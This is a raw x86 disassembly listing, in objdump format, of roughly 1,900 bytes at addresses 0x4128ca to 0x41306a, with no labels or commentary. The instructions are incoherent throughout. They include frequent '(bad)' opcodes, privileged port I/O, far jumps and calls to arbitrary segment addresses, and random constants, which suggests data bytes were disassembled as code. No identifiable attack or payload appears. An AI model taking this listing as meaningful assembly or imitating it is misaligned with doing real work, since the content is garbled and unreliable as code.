  4128ca:	adc    eax,eax
  4128cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128cd:	xor    bl,BYTE PTR [eax]
  4128cf:	or     al,0x35
  4128d1:	and    BYTE PTR [ebx+0x47ef14d0],cl
  4128d7:	inc    ebp
  4128d8:	fisttp DWORD PTR [ebp+0x55415172]
  4128de:	aam    0x6
  4128e0:	jmp    0xff37:0x48aee5c3
  4128e7:	idiv   DWORD PTR [ecx]
  4128e9:	dec    esi
  4128ea:	shl    BYTE PTR [esi-0x13e61632],cl
  4128f0:	in     al,dx
  4128f1:	pushf  
  4128f2:	sbb    al,0xf2
  4128f4:	sub    bh,BYTE PTR [edx]
  4128f6:	stos   BYTE PTR es:[edi],al
  4128f7:	jmp    0xb2a2:0xb36da4b2
  4128fe:	xchg   BYTE PTR [ebp-0xc03a152],bh
  412904:	repnz sti 
  412906:	inc    ecx
  412907:	dec    esi
  412908:	sti    
  412909:	pop    ebx
  41290a:	das    
  41290b:	in     eax,0x10
  41290d:	shr    DWORD PTR [edx+0x3b8d7bac],0xe1
  412914:	adc    esp,DWORD PTR [esi+eax*8-0x26]
  412918:	imul   DWORD PTR ds:0xd7379b3d
  41291e:	in     al,0x5e
  412920:	jmp    0x90143ac5
  412925:	and    BYTE PTR [eax],bl
  412927:	pop    esp
  412928:	scas   eax,DWORD PTR es:[edi]
  412929:	(bad)  
  41292a:	es retf 0x4330
  41292e:	add    dl,BYTE PTR [edx]
  412930:	adc    bh,BYTE PTR [edx+0x15]
  412933:	fs mov edx,0xa4a66fdf
  412939:	in     al,dx
  41293a:	cmp    edi,DWORD PTR [edi-0x59]
  41293d:	pop    ecx
  41293f:	inc    esp
  412940:	call   0xca17b588
  412945:	mov    dl,BYTE PTR [ebp-0x647dce71]
  41294b:	sbb    eax,DWORD PTR [esi-0xc6fe3dc]
  412951:	(bad)  
  412952:	daa    
  412953:	mov    DWORD PTR [ecx],esi
  412955:	add    DWORD PTR [edi+0x13],ecx
  412958:	pop    edx
  412959:	cmp    BYTE PTR [ebx-0x25c9521f],dh
  41295f:	inc    ebp
  412960:	fstp   DWORD PTR [edi-0x6d55f385]
  412966:	(bad)  
  412967:	add    esp,eax
  412969:	and    esp,0xa429ca1
  41296f:	cmp    BYTE PTR [edi+0x2d],cl
  412972:	add    BYTE PTR [edi+0x5],dh
  412975:	xchg   BYTE PTR [ebx+0x7f],dl
  412978:	mov    DWORD PTR [edx+0x46df4028],edi
  41297e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41297f:	(bad)  
  412980:	fdivr  DWORD PTR [ebp+0x9]
  412983:	hlt    
  412984:	xor    ecx,DWORD PTR [eax+0x2a]
  412987:	(bad)  [ecx+ecx*1+0x65]
  41298b:	int3   
  41298c:	mov    esp,0x6e89b65
  412991:	mov    bh,0x61
  412993:	or     BYTE PTR [ebx],al
  412995:	pop    ss
  412996:	test   dl,dh
  412998:	out    0xa1,al
  41299a:	scas   al,BYTE PTR es:[edi]
  41299b:	fwait
  41299c:	pusha  
  41299d:	xor    edx,DWORD PTR [ebp+0x75d4f68d]
  4129a3:	jp     0x4129a0
  4129a5:	pop    edx
  4129a6:	stos   BYTE PTR es:[edi],al
  4129a7:	mov    DWORD PTR [eax],0x30d2bc2
  4129ad:	pop    edx
  4129ae:	aas    
  4129af:	mov    ch,BYTE PTR [esi+0x7b80a186]
  4129b5:	push   ebp
  4129b6:	outs   dx,BYTE PTR ds:[esi]
  4129b7:	pusha  
  4129b8:	loop   0x41297f
  4129ba:	mov    ch,0x5b
  4129bc:	mov    ebx,0x3a243a91
  4129c1:	jo     0x4129a8
  4129c3:	push   esp
  4129c4:	xchg   edi,eax
  4129c5:	test   BYTE PTR [ebx],cl
  4129c7:	rcr    eax,cl
  4129c9:	call   0xf349:0xfa0417db
  4129d0:	out    dx,al
  4129d1:	and    al,0x67
  4129d3:	lock rol DWORD PTR [edx],cl
  4129d6:	sub    bh,BYTE PTR [eax+0x6a]
  4129d9:	iret   
  4129da:	(bad)  
  4129db:	mov    eax,0x3069e707
  4129e0:	cdq    
  4129e1:	repnz add DWORD PTR [edx-0xadfe320],edx
  4129e8:	cmp    bh,ch
  4129ea:	sti    
  4129eb:	push   es
  4129ec:	jge    0x4129f9
  4129ee:	cmp    al,0xea
  4129f1:	or     BYTE PTR [edi],ah
  4129f3:	(bad)  
  4129f4:	retf   
  4129f5:	push   0xc41512cc
  4129fa:	sbb    BYTE PTR [edx-0x1c],dh
  4129fd:	in     al,dx
  4129fe:	arpl   WORD PTR [ebp-0x78],dx
  412a01:	jns    0x4129b1
  412a03:	mov    cl,ah
  412a05:	push   esp
  412a06:	and    bl,dh
  412a08:	sahf   
  412a09:	bound  esp,QWORD PTR [ecx-0x59a0811a]
  412a0f:	call   0x10f1:0x171c78e
  412a16:	call   0x74d8:0x8eb7bd70
  412a1d:	dec    esi
  412a1e:	test   ch,dh
  412a20:	inc    edi
  412a21:	cld    
  412a22:	cmp    edi,0xffffffcb
  412a25:	pushf  
  412a26:	lock loop 0x412a30
  412a29:	fcom   QWORD PTR [eax+ebp*4]
  412a2d:	fsub   st,st(2)
  412a2f:	(bad)  
  412a30:	mov    ch,0xa8
  412a32:	add    ebx,DWORD PTR [ebx+0x56b05420]
  412a38:	mov    ecx,0x66d330f0
  412a3d:	neg    DWORD PTR [esi+edi*2+0x60]
  412a41:	test   al,0xaa
  412a43:	add    al,0x79
  412a45:	xchg   DWORD PTR [esi],esi
  412a47:	lea    ebp,[ebx]
  412a49:	xchg   ecx,eax
  412a4a:	xor    ebx,esp
  412a4c:	dec    ebx
  412a4d:	mov    dh,0xe5
  412a4f:	xor    ch,BYTE PTR [edi-0x78]
  412a52:	fsub   QWORD PTR [ebp+0x5f]
  412a55:	xchg   ebp,eax
  412a56:	aad    0xf9
  412a58:	mov    esi,0xa89a4562
  412a5d:	add    edx,DWORD PTR ds:0xf72b8bb0
  412a63:	jae    0x412a03
  412a65:	data16 xor dh,BYTE PTR [eax]
  412a68:	push   0xffffff8b
  412a6a:	jns    0x412a30
  412a6c:	and    DWORD PTR [edi+ecx*2+0x33dabbb2],ecx
  412a73:	aaa    
  412a74:	fld    TBYTE PTR [eax]
  412a76:	enter  0xf565,0x6
  412a7a:	xchg   ebp,eax
  412a7b:	jo     0x412adf
  412a7d:	adc    BYTE PTR [ecx-0x5],cl
  412a80:	mov    ebp,0x4319146b
  412a85:	sar    ecx,1
  412a87:	jge    0x412a12
  412a89:	retf   
  412a8a:	aaa    
  412a8b:	or     esp,DWORD PTR [ecx-0x70]
  412a8e:	enter  0xf6da,0x83
  412a92:	cs pop ebp
  412a94:	mov    ah,0xc5
  412a96:	cli    
  412a97:	scas   al,BYTE PTR es:[edi]
  412a98:	cmp    edi,esi
  412a9a:	iret   
  412a9b:	jp     0x412a78
  412a9d:	cmp    ah,bl
  412a9f:	push   esp
  412aa0:	ja     0x412a6f
  412aa2:	out    dx,eax
  412aa3:	and    ah,bl
  412aa5:	jne    0x412a58
  412aa7:	lock hlt 
  412aa9:	and    eax,0xa281fcd5
  412aae:	stos   DWORD PTR es:[edi],eax
  412aaf:	xor    eax,0xe2c4a7fd
  412ab5:	push   esi
  412ab6:	cmp    eax,0x6279128c
  412abb:	in     al,0xa6
  412abd:	fdiv   DWORD PTR [ebp+0x1dd56c35]
  412ac3:	aad    0x36
  412ac5:	call   0x5234:0x521ae0a6
  412acc:	mov    DWORD PTR [edx],ebp
  412ace:	jb     0x412b39
  412ad0:	ins    BYTE PTR es:[edi],dx
  412ad1:	scas   al,BYTE PTR es:[edi]
  412ad2:	cmp    DWORD PTR [esi+0x10],ecx
  412ad5:	retf   0xbc97
  412ad8:	or     al,BYTE PTR [ecx+0x2014b8b2]
  412ade:	mov    bh,0x3d
  412ae0:	xchg   BYTE PTR [ecx+0x4cb9794a],dh
  412ae6:	jg     0x412afc
  412ae8:	ins    DWORD PTR es:[edi],dx
  412ae9:	ins    DWORD PTR es:[edi],dx
  412aea:	mov    ebp,0x4eece1bc
  412aef:	nop
  412af0:	pop    ebx
  412af1:	cld    
  412af2:	dec    ecx
  412af3:	dec    ebp
  412af4:	push   ds
  412af5:	adc    BYTE PTR [ebx+ecx*8],0x8c
  412af9:	pushf  
  412afa:	daa    
  412afb:	daa    
  412afc:	xlat   BYTE PTR ds:[ebx]
  412afd:	test   DWORD PTR [edi+eax*2-0x6a5e71f9],0xee2aa622
  412b08:	in     al,dx
  412b09:	mov    eax,ds:0x203b161f
  412b0e:	cmp    eax,0xa58ab897
  412b13:	popf   
  412b14:	stc    
  412b15:	and    cl,BYTE PTR [edx+0x2784bf42]
  412b1b:	and    BYTE PTR [edi-0x6b],bh
  412b1e:	xor    ah,BYTE PTR [ebp-0x3d]
  412b21:	mov    ecx,0x37f8642b
  412b26:	rcr    DWORD PTR [edx-0x5fe2bac8],1
  412b2c:	popf   
  412b2d:	mov    ah,0xb2
  412b2f:	in     eax,0xd
  412b31:	in     al,dx
  412b32:	mov    esp,0x979eebf5
  412b37:	dec    edx
  412b38:	push   ecx
  412b39:	push   edi
  412b3a:	mov    esi,gs
  412b3c:	jbe    0x412b34
  412b3e:	push   ecx
  412b3f:	ds jne 0x412b42
  412b42:	jle    0x412b59
  412b44:	outs   dx,BYTE PTR ds:[esi]
  412b45:	test   DWORD PTR [ebp-0x66fb3efe],ebx
  412b4b:	or     al,0xd3
  412b4d:	icebp  
  412b4e:	retf   
  412b4f:	test   eax,0x7aabd15d
  412b54:	fnstenv [ecx]
  412b56:	test   BYTE PTR [si],bh
  412b59:	pop    es
  412b5a:	sbb    edx,eax
  412b5c:	pop    esi
  412b5d:	mul    dl
  412b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b60:	bnd ret 0xc0a3
  412b64:	push   es
  412b65:	popa   
  412b66:	sbb    al,BYTE PTR [ebp-0x22]
  412b69:	call   0xba04:0xd8bdc0a8
  412b70:	pop    es
  412b71:	jno    0x412bf1
  412b73:	pop    eax
  412b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b75:	sbb    al,0xe8
  412b77:	pop    esp
  412b78:	mov    ebp,0x66402baf
  412b7d:	sti    
  412b7e:	mov    ds:0x37c85b85,eax
  412b83:	xchg   ebp,eax
  412b84:	retf   0xdc25
  412b87:	pusha  
  412b88:	pushf  
  412b89:	jle    0x412bd5
  412b8b:	mov    cs,WORD PTR [edx]
  412b8d:	or     eax,0xf0ac46bf
  412b92:	cmp    al,0x2f
  412b94:	lea    edi,[ebx]
  412b96:	jno    0x412bce
  412b98:	ret    
  412b99:	pop    ebp
  412b9a:	outs   dx,BYTE PTR ds:[esi]
  412b9b:	imul   DWORD PTR [ebx+0x28]
  412b9e:	pusha  
  412b9f:	dec    esi
  412ba0:	(bad)  
  412ba1:	jle    0x412bbd
  412ba3:	mov    ah,0xc8
  412ba5:	adc    al,0xb7
  412ba7:	pop    ecx
  412ba8:	inc    ebx
  412ba9:	and    BYTE PTR [edi+0x3],0x6d
  412bad:	mov    al,0xf3
  412baf:	dec    eax
  412bb0:	(bad)  
  412bb2:	jl     0x412bcc
  412bb4:	push   ecx
  412bb5:	mov    ds:0xabf7af86,al
  412bba:	jecxz  0x412c14
  412bbc:	mov    dh,0xb0
  412bbe:	inc    ebp
  412bbf:	mov    al,ds:0xae486d79
  412bc4:	xor    eax,0x94d95ba8
  412bc9:	and    eax,0x19a99cd9
  412bce:	pusha  
  412bcf:	fs in  eax,dx
  412bd1:	mov    al,ds:0xd99bfa07
  412bd6:	retf   
  412bd7:	inc    esi
  412bd8:	test   al,0x8
  412bda:	push   esp
  412bdb:	out    0x2c,eax
  412bdd:	xchg   edx,eax
  412bde:	ss cwde 
  412be0:	push   ebp
  412be1:	mov    edx,0xee00c7b
  412be6:	inc    ecx
  412be7:	shl    dh,1
  412be9:	and    DWORD PTR [ecx+edi*4-0x7cd5cda1],esp
  412bf0:	imul   ecx,DWORD PTR [eax],0x7d
  412bf3:	out    dx,al
  412bf4:	out    0x7,eax
  412bf6:	fsubr  st,st(0)
  412bf8:	push   0xe34a63f6
  412bfd:	out    dx,eax
  412bfe:	push   eax
  412bff:	and    eax,0xd592db65
  412c04:	xor    al,0x3c
  412c06:	push   ds
  412c07:	jecxz  0x412bdb
  412c09:	pop    ss
  412c0a:	jns    0x412bd6
  412c0c:	and    ch,bh
  412c0e:	dec    edi
  412c0f:	in     eax,0xea
  412c11:	aam    0x99
  412c13:	adc    DWORD PTR [ebx+ebp*4-0x75],edi
  412c17:	push   0x2f
  412c19:	xchg   ebx,eax
  412c1a:	push   0x39
  412c1c:	(bad)  [esi]
  412c1e:	aad    0xa2
  412c20:	jg     0x412c6e
  412c22:	daa    
  412c23:	call   FWORD PTR [edi+esi*8+0x5c2fa3e0]
  412c2a:	pop    ss
  412c2b:	jecxz  0x412c85
  412c2d:	add    eax,DWORD PTR [eax+0x2c60b499]
  412c33:	add    DWORD PTR [ebp+0x7],ecx
  412c36:	sub    BYTE PTR [edi+0x6a9ca76],0x3a
  412c3d:	inc    esi
  412c3e:	push   edi
  412c3f:	lds    edx,FWORD PTR [edx-0x2f]
  412c42:	shl    DWORD PTR [ecx-0x2e6e8cfa],1
  412c48:	sbb    cl,BYTE PTR [ebx+0x1599536]
  412c4e:	xchg   ecx,eax
  412c4f:	push   edx
  412c50:	xor    dh,BYTE PTR [ecx+0x2e6b9819]
  412c56:	repz sbb bh,BYTE PTR [eax+0x19a9ee65]
  412c5d:	sub    ebx,esp
  412c5f:	pushf  
  412c60:	scas   al,BYTE PTR es:[edi]
  412c61:	ds imul esi,ebx,0xffffffa1
  412c65:	jno    0x412c26
  412c67:	xlat   BYTE PTR ds:[ebx]
  412c68:	ret    0xa820
  412c6b:	fcomp  st(6)
  412c6d:	and    dl,bl
  412c6f:	xchg   BYTE PTR [edi+ebx*4+0x331fb532],bh
  412c76:	dec    ecx
  412c77:	pop    edx
  412c78:	mov    esi,0x440845a9
  412c7d:	push   esi
  412c7e:	xor    eax,0x2dcf8a48
  412c83:	rcl    DWORD PTR [ecx-0x14497c9c],0xb1
  412c8a:	test   al,0xb0
  412c8c:	pop    ebx
  412c8d:	add    BYTE PTR [edx],ch
  412c8f:	xchg   esi,eax
  412c90:	dec    BYTE PTR [ebx+eiz*2+0x7d28b119]
  412c97:	cmp    al,0x3f
  412c99:	dec    eax
  412c9a:	cld    
  412c9b:	cmp    eax,0x5196fa67
  412ca0:	lock jb 0x412c3f
  412ca3:	dec    DWORD PTR [ebx]
  412ca5:	sub    al,0x50
  412ca7:	test   bh,al
  412ca9:	lahf   
  412caa:	scas   eax,DWORD PTR es:[edi]
  412cab:	mov    edi,0x114b77d8
  412cb0:	xor    ebp,DWORD PTR [eax+0x7d234c09]
  412cb6:	dec    DWORD PTR [ebx]
  412cb8:	nop
  412cb9:	jg     0x412c48
  412cbb:	inc    edx
  412cbc:	sbb    BYTE PTR [esi+ebp*4],al
  412cbf:	into   
  412cc0:	push   ecx
  412cc1:	in     al,dx
  412cc2:	dec    ebp
  412cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cc4:	mov    esp,0x34670ffd
  412cc9:	xlat   BYTE PTR ds:[ebx]
  412cca:	int    0x51
  412ccc:	popf   
  412ccd:	mov    ecx,0x3feb339d
  412cd2:	jb     0x412c71
  412cd4:	sub    cl,BYTE PTR [ecx+0x22]
  412cd7:	mov    BYTE PTR [ebx-0x43779cdb],dh
  412cdd:	stos   BYTE PTR es:[edi],al
  412cde:	inc    ecx
  412cdf:	xchg   edx,eax
  412ce0:	mov    ah,0x7
  412ce2:	xor    al,0xc3
  412ce4:	inc    edx
  412ce5:	sbb    bh,BYTE PTR [ebp+0x79f0f84e]
  412ceb:	(bad)  
  412ced:	js     0x412d6a
  412cef:	or     dh,al
  412cf1:	mov    ch,0x57
  412cf3:	rcr    DWORD PTR [eax],1
  412cf5:	(bad)  
  412cf6:	ss or  al,0xc3
  412cf9:	retf   0x32f
  412cfc:	add    eax,0x4f98811d
  412d01:	mov    ebp,0xf5e2e423
  412d06:	shr    BYTE PTR ds:0xc225c9c6,0x37
  412d0d:	repz cdq 
  412d0f:	out    dx,eax
  412d10:	shl    BYTE PTR [ebp+0x270b6ca2],1
  412d16:	mov    dl,0xc7
  412d18:	(bad)  
  412d19:	and    al,bl
  412d1b:	in     eax,0x6a
  412d1d:	in     al,0xa7
  412d1f:	xor    eax,0xfb633d6e
  412d24:	sti    
  412d25:	sti    
  412d26:	in     eax,dx
  412d27:	aad    0xbf
  412d29:	(bad)  
  412d2a:	iret   
  412d2b:	lea    eax,[esi+ebp*1]
  412d2e:	adc    dh,bl
  412d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d31:	mov    ebp,0x8e17d8f3
  412d36:	mov    BYTE PTR [esi+0xd],0x1b
  412d3a:	(bad)  [ecx-0x79]
  412d3d:	or     eax,0x6edd982e
  412d42:	xor    eax,0x8abfcba5
  412d47:	mov    edx,0xbfe6fdad
  412d4c:	cmp    edi,ebx
  412d4e:	or     al,0xe5
  412d50:	push   es
  412d51:	jo     0x412d96
  412d53:	stos   DWORD PTR es:[edi],eax
  412d54:	push   esi
  412d55:	cmc    
  412d56:	xchg   ebp,eax
  412d57:	inc    esi
  412d58:	fbstp  TBYTE PTR [eax]
  412d5a:	xor    DWORD PTR [edx-0x2b],ebx
  412d5d:	out    dx,eax
  412d5e:	stos   DWORD PTR es:[edi],eax
  412d5f:	mov    DWORD PTR [esi-0x6403fb8e],edi
  412d65:	jns    0x412d6e
  412d67:	stos   BYTE PTR es:[edi],al
  412d68:	adc    al,0xd2
  412d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d6b:	sbb    al,0x93
  412d6d:	stc    
  412d6e:	inc    eax
  412d70:	cbw    
  412d72:	in     al,dx
  412d73:	es es and ecx,edi
  412d77:	push   ebx
  412d78:	or     al,0xcb
  412d7a:	jmp    0x412db3
  412d7c:	sub    al,0x8e
  412d7e:	adc    DWORD PTR [ebp-0x1c3733da],0xc55c3431
  412d88:	test   DWORD PTR [edx+0x20],eax
  412d8b:	ss mul bh
  412d8e:	not    DWORD PTR [edi-0x2c63f292]
  412d94:	mov    ah,0x33
  412d96:	retf   0x7895
  412d99:	ja     0x412d3b
  412d9b:	iret   
  412d9c:	fsub   QWORD PTR [esi-0x19]
  412d9f:	sar    BYTE PTR [edi+eax*4],0x10
  412da3:	add    cl,al
  412da5:	sbb    al,BYTE PTR [edi-0x80]
  412da8:	cmp    BYTE PTR [ecx-0x1e971e45],dl
  412dae:	scas   al,BYTE PTR es:[edi]
  412daf:	rcr    bl,cl
  412db1:	cmp    edi,DWORD PTR [edi-0x50fd7207]
  412db7:	jno    0x412db4
  412db9:	ror    DWORD PTR [eax+0xe],0x61
  412dbd:	lock (bad) 
  412dbf:	sub    esi,ebx
  412dc1:	xchg   BYTE PTR [edi-0x71],ah
  412dc4:	push   edi
  412dc5:	adc    eax,0x7a828a7c
  412dca:	xor    dl,BYTE PTR [eax-0x416bc3b4]
  412dd0:	xlat   BYTE PTR ds:[ebx]
  412dd1:	push   es
  412dd2:	sub    eax,0x3f7e9941
  412dd7:	ret    
  412dd8:	in     al,dx
  412dd9:	jmp    0xc133:0xf009b238
  412de0:	jecxz  0x412d79
  412de2:	mov    al,0x27
  412de4:	int    0x19
  412de6:	(bad)  
  412de7:	fstp   TBYTE PTR [edx-0x7d50e3dc]
  412ded:	jg     0x412d90
  412def:	es mov esp,0xda75680c
  412df5:	xchg   ebx,eax
  412df6:	adc    eax,0x9b71ebe2
  412dfb:	and    al,0x6d
  412dfd:	in     al,dx
  412dfe:	or     DWORD PTR [bx+si],0xffffffb4
  412e02:	ss push eax
  412e04:	(bad)  
  412e05:	xchg   ebp,eax
  412e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e07:	xchg   BYTE PTR [eax-0xe635ef4],dh
  412e0d:	and    BYTE PTR [edi+0x67],al
  412e10:	inc    esi
  412e11:	rol    dh,1
  412e13:	retf   
  412e14:	adc    al,0xe5
  412e16:	out    0x77,al
  412e18:	cmp    ebx,DWORD PTR [ebp+0x72]
  412e1b:	repz sbb eax,0xe6e79720
  412e21:	xchg   esp,eax
  412e22:	mov    ds:0x1e140f,al
  412e27:	sub    edi,eax
  412e29:	lods   al,BYTE PTR ds:[esi]
  412e2a:	cld    
  412e2b:	push   ebx
  412e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e2d:	xchg   ebp,eax
  412e2e:	and    DWORD PTR [edx+0x2f],ebp
  412e31:	stos   BYTE PTR es:[edi],al
  412e32:	and    ah,al
  412e34:	call   DWORD PTR [edx+0x42]
  412e37:	xchg   ebx,eax
  412e38:	stos   BYTE PTR es:[edi],al
  412e39:	shl    BYTE PTR [ebp-0x5e],cl
  412e3c:	push   edi
  412e3d:	fs leave 
  412e3f:	xchg   edx,eax
  412e40:	scas   eax,DWORD PTR es:[edi]
  412e41:	rol    BYTE PTR [ebp+0x80b79a3],0x9d
  412e48:	jp     0x412e48
  412e4a:	push   cs
  412e4b:	cmc    
  412e4c:	add    esp,DWORD PTR [edx+0x4e]
  412e4f:	push   es
  412e50:	fisub  WORD PTR ds:0xedae0a31
  412e56:	(bad)  
  412e57:	data16 jbe 0x412de0
  412e5a:	mov    eax,ds:0x422b2f7b
  412e5f:	(bad)  
  412e60:	jbe    0x412e44
  412e62:	xor    bl,bh
  412e64:	sub    DWORD PTR [edi-0x34],eax
  412e67:	mov    dh,0xb2
  412e69:	pop    es
  412e6a:	into   
  412e6b:	mov    esi,0x14e0bc22
  412e70:	pop    ds
  412e71:	inc    ecx
  412e72:	push   0xffffff9c
  412e74:	ret    
  412e75:	or     dl,bl
  412e77:	aad    0x49
  412e79:	ds (bad) 
  412e7c:	mov    bh,0xd1
  412e7e:	cmp    DWORD PTR [ebp+0x48d9a4],0xfffffff6
  412e85:	cdq    
  412e86:	stos   BYTE PTR es:[edi],al
  412e87:	push   cs
  412e88:	dec    edi
  412e89:	and    dh,BYTE PTR [ecx+0xb6e5f31]
  412e8f:	mov    edx,?
  412e91:	mov    dh,0xdd
  412e93:	(bad)  
  412e95:	xchg   ebx,eax
  412e96:	aam    0xec
  412e98:	hlt    
  412e99:	(bad)  [edi]
  412e9b:	push   es
  412e9c:	add    esp,ebx
  412e9e:	pop    es
  412e9f:	out    dx,al
  412ea0:	jmp    0x9728:0xa3d92e6e
  412ea7:	retf   
  412ea8:	aad    0x25
  412eaa:	sar    bh,cl
  412eac:	mov    ah,0x42
  412eae:	sbb    al,0xb7
  412eb0:	pop    edi
  412eb1:	(bad)  
  412eb2:	stos   BYTE PTR es:[edi],al
  412eb3:	rol    DWORD PTR [esi],0xf8
  412eb6:	pushf  
  412eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb8:	push   ds
  412eb9:	inc    esi
  412eba:	sub    BYTE PTR [edx],0x66
  412ebd:	or     DWORD PTR [edi],eax
  412ebf:	push   ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	mov    BYTE PTR ds:0x65597f7b,ah
  412ec7:	outs   dx,BYTE PTR ds:[esi]
  412ec8:	pop    ds
  412ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eca:	sbb    al,0x7c
  412ecc:	loopne 0x412ec8
  412ece:	xchg   ecx,eax
  412ecf:	dec    ebx
  412ed0:	xchg   ecx,eax
  412ed1:	sar    BYTE PTR [edi+esi*2],0x6b
  412ed5:	ja     0x412e90
  412ed7:	xchg   BYTE PTR [eax+edi*1-0x4d24f399],cl
  412ede:	sbb    al,0x95
  412ee0:	sub    cl,bh
  412ee2:	dec    ebp
  412ee3:	nop
  412ee4:	sbb    dl,BYTE PTR [esi+eax*8-0x7c]
  412ee8:	aaa    
  412ee9:	pop    edx
  412eea:	(bad)  
  412eeb:	jecxz  0x412e7d
  412eed:	sub    dl,BYTE PTR [esi]
  412eef:	xchg   esp,eax
  412ef0:	stc    
  412ef1:	cwde   
  412ef2:	push   ecx
  412ef3:	out    0xa9,eax
  412ef5:	adc    esi,edi
  412ef7:	in     eax,dx
  412ef8:	mov    es,WORD PTR [ecx+0x965b7e]
  412efe:	int3   
  412eff:	scas   eax,DWORD PTR es:[edi]
  412f00:	lods   eax,DWORD PTR ds:[esi]
  412f01:	dec    ecx
  412f02:	and    eax,0x860821fd
  412f07:	fcmovbe st,st(3)
  412f09:	mov    bl,0x3f
  412f0b:	stos   DWORD PTR es:[edi],eax
  412f0c:	mov    eax,ds:0x71a7e2ff
  412f11:	sahf   
  412f12:	mov    ds:0x72513002,al
  412f17:	push   ebp
  412f18:	stos   DWORD PTR es:[edi],eax
  412f19:	fadd   DWORD PTR [ebp-0x5e]
  412f1c:	adc    DWORD PTR [ebx],eax
  412f1e:	shl    BYTE PTR [ecx-0x5b9e3b47],cl
  412f24:	sub    ebx,DWORD PTR [ebx]
  412f26:	call   0x911b6a0d
  412f2b:	xchg   ebp,eax
  412f2c:	dec    ecx
  412f2d:	xor    BYTE PTR [ecx],ch
  412f2f:	leave  
  412f30:	loop   0x412ecb
  412f32:	jne    0x412f61
  412f34:	push   cs
  412f35:	pop    ds
  412f36:	inc    edx
  412f37:	out    0xb7,eax
  412f39:	jbe    0x412efc
  412f3b:	or     al,0xbb
  412f3d:	mov    bl,0x71
  412f3f:	retf   
  412f40:	xlat   BYTE PTR ds:[ebx]
  412f41:	out    dx,eax
  412f42:	pop    es
  412f43:	scas   al,BYTE PTR es:[edi]
  412f44:	xor    edx,DWORD PTR [eax+eiz*8]
  412f47:	mov    bl,0x78
  412f49:	push   ebx
  412f4a:	call   0x5684:0x5e52d31f
  412f51:	mov    ds:0x6a123181,al
  412f56:	cld    
  412f57:	pop    es
  412f58:	push   edi
  412f59:	xchg   esi,eax
  412f5a:	inc    esp
  412f5b:	test   al,0xab
  412f5d:	call   0x8546:0x7e7aa8ae
  412f64:	push   es
  412f65:	sbb    DWORD PTR [eax+0x49e7c1ca],edi
  412f6b:	pop    ds
  412f6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f6d:	and    edx,edx
  412f6f:	dec    esi
  412f70:	out    0xdb,al
  412f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f73:	loopne 0x412f0e
  412f75:	xchg   edi,eax
  412f76:	fwait
  412f77:	add    eax,0xaf83923e
  412f7c:	mov    edi,0x5f46d948
  412f81:	push   esi
  412f82:	leave  
  412f83:	jl     0x412fcf
  412f85:	mov    ds:0xdd1ad273,al
  412f8a:	and    bl,BYTE PTR [ebx+0x1ef25b01]
  412f90:	jno    0x412fe9
  412f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f93:	pop    ebp
  412f94:	aas    
  412f95:	repz mov ch,0xd5
  412f98:	repnz push cs
  412f9a:	ins    BYTE PTR es:[edi],dx
  412f9b:	mov    cs,WORD PTR [eax+0x50066945]
  412fa1:	iret   
  412fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fa3:	int    0xa2
  412fa5:	rcl    BYTE PTR [eax],0x97
  412fa8:	test   BYTE PTR [esi-0x7d],dl
  412fab:	shl    DWORD PTR [eax],1
  412fad:	add    eax,0x5005af29
  412fb2:	mov    ah,0xb0
  412fb4:	or     eax,0x67471921
  412fb9:	mov    al,ds:0x4cc42f5f
  412fbe:	int    0x46
  412fc0:	mov    al,ds:0xa2413b3
  412fc5:	inc    ebp
  412fc6:	jl     0x412fbc
  412fc8:	pop    edx
  412fc9:	pop    edi
  412fca:	jb     0x412f71
  412fcc:	in     al,0xef
  412fce:	inc    eax
  412fcf:	mov    BYTE PTR [ecx-0x7e],bh
  412fd2:	mov    eax,ds:0x16b2e144
  412fd7:	repnz mov eax,ds:0x771d0654
  412fdd:	rcl    BYTE PTR [ebx+0x1f],0x12
  412fe1:	call   0xfb32:0xb92dca6b
  412fe8:	add    BYTE PTR [esi+0x26cbfd3a],ah
  412fee:	or     esi,ebx
  412ff0:	imul   eax,edi,0xffffffe7
  412ff3:	arpl   WORD PTR [eax-0x3f],si
  412ff6:	add    ecx,DWORD PTR [edi-0x701e20fd]
  412ffc:	shl    DWORD PTR [ecx-0x2878486f],1
  413002:	in     al,0x8c
  413004:	xor    dh,bh
  413006:	sbb    BYTE PTR [ebx],ch
  413008:	enter  0xc383,0xd4
  41300c:	retf   
  41300d:	not    BYTE PTR [ebp-0x33]
  413010:	mov    ch,0x6c
  413012:	push   gs
  413014:	mov    dh,BYTE PTR [esi+ebx*8]
  413017:	dec    ebx
  413018:	not    BYTE PTR [edx-0x1caa3c8b]
  41301e:	jmp    0x413097
  413020:	not    DWORD PTR [esi]
  413022:	aas    
  413023:	sbb    BYTE PTR [ebx+0x26d73a9b],ch
  413029:	mov    eax,DWORD PTR [edx]
  41302b:	shr    DWORD PTR [edx+0x4f],0x12
  41302f:	in     eax,dx
  413030:	not    dl
  413032:	jge    0x41301a
  413034:	fisub  WORD PTR [eax+0x661595d5]
  41303a:	pop    eax
  41303b:	mov    bh,0x1b
  41303d:	adc    DWORD PTR [ebp+edx*4+0x6302f335],edx
  413044:	sbb    dl,bl
  413046:	call   0xa7df4e2
  41304b:	push   ebx
  41304c:	sbb    BYTE PTR [ebx-0x53eeccb6],al
  413052:	cli    
  413053:	repnz shl DWORD PTR [edx+ebp*4+0x33bb6dd5],1
  41305b:	dec    edi
  41305c:	call   DWORD PTR [edi-0x44355cbf]
  413062:	test   al,0xec
  413064:	pusha  
  413065:	jmp    0x41301b
  413067:	sub    ch,BYTE PTR [edx-0x7e3bf78a]
